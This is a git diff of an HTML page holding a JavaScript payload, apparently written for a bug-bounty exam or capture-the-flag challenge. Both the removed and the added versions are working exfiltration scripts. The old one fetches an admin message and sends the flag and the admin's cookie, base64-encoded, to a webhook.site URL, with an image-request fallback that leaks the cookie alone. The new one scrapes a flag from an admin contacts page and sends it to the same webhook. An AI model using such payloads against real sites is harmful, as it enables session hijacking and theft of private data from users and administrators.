@@ -1,31 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head><title>Success</title></head>
 <body>
     <script>
-      (async () => {
-    const webhook = "https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7";
-    const targetMsg = "69ea971bbee6d6b7c6646510";
-    
-    try {
-        // Step 1: Steal the flag from your message
-        const res = await fetch('/api/admin/messages/' + targetMsg);
-        const data = await res.json();
-        
-        // Step 2: Send the flag and the Admin's cookie to your webhook
-        await fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: btoa(JSON.stringify({
-                flag: data.content || data,
-                cookie: document.cookie
-            }))
+        // 1. Reach back to the Admin Dashboard
+        fetch('https://bugbounty-exam.hashacademy.co/admin/contacts')
+        .then(response => response.text())
+        .then(html => {
+            // 2. Search for the flag pattern
+            const flagMatch = html.match(/Hash{[^}]+}/i);
+            const content = flagMatch ? flagMatch[0] : "Flag_Not_Found_On_Contacts";
+
+            // 3. Send it to your NEW webhook
+            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?flag=' + btoa(content));
+        })
+        .catch(err => {
+            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?error=' + btoa(err));
         });
-    } catch (e) {
-        // Fallback: Just leak the cookie if the fetch fails
-        new Image().src = webhook + "/error?c=" + btoa(document.cookie);
-    }
-})();
     </script>
 </body>
 </html>
